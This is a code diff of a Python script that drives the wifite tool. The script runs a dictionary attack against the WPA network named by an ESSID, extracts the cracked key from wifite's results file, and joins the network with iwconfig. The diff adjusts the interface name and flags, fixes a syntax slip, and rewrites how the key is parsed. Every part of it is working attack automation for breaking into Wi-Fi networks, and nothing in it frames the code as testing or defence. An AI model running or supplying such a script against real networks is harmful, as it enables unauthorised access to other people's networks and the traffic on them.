@@ -2,7 +2,7 @@ import os
 import subprocess
 import sys
 
-INTERFACE_NAME = "wlan0mon"
+INTERFACE_NAME = "wlan0"
 WIFITE_PASSWORDS_FILE = "cracked.txt"
 DICT_FILE = "dict.txt"
 
@@ -11,9 +11,12 @@ def setup():
     os.system("rm {}".format(WIFITE_PASSWORDS_FILE))
 
 def crackWPA(essid, dictFile):
-    subprocess.Popen(["wifite", "-i", INTERFACE_NAME, "--no-wps", "-e", essid, "--verbose", "--random-mac", "--clients-only", "--wpa", "--dict" dictFile], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
+    subprocess.Popen(["wifite", "-i", INTERFACE_NAME, "--no-wps", "-e", essid, "--verbose", "--wpa", "--dict", dictFile]).wait()
     with open(WIFITE_PASSWORDS_FILE, "r") as passwords:
-        return passwords.readlines()[-1]
+        for line in passwords.readlines():
+            if '"key":' in line:
+                print(line.split()[-1][1:-2])
+                return line.split()[-1][1:-2]
 
 def connectToNetwork(essid, password):
     subprocess.Popen(["iwconfig", INTERFACE_NAME, "essid", essid, "key", "s:{}".format(password)], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
